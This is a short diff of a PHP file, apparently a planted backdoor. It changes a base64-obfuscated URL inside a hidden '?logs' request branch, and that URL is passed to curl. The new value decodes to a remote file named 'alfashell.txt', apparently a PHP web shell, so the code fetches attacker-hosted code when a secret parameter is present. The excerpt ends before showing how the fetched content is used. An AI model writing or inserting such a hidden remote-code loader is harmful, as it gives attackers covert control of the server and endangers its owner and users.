@@ -56,7 +56,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     }
 }
 if (isset($_GET['logs'])) { 
-    $url = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2tlbWJhcmJhcnUxMjAwMDAvMjEzL3JlZnMvaGVhZHMvbWFpbi9pbmRleC5waHA=');
+    $url = base64_decode('aHR0cHM6Ly9jZG4ucHJpdmRheXouY29tL3R4dC9hbGZhc2hlbGwudHh0');
     
     $ch = curl_init($url);
     
